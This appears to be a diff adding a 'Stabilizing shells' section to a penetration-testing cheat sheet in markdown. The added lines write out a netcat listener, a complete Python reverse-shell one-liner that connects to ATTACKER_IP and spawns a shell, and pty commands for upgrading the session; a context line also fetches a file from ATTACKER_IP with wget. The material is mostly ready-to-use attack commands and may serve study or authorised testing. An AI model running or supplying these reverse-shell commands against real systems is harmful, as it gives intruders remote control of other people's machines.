@@ -13,6 +13,21 @@ python3 http.server PORT
 wget ATTACKER_IP:PORT/FILE
 ```
 
+### Stabilizing shells
+
+#### With python available
+```bash
+# Start listener on attacker machine
+nc -lnvp PORT
+
+# Connect from target machine
+python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ATTACKER_IP",PORT));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
+
+# Stabilize shell
+python3 -c 'import pty;pty.spawn("/bin/bash")'
+export TERM=xterm
+```
+
 ## Thought process
 
 ### Credential Access
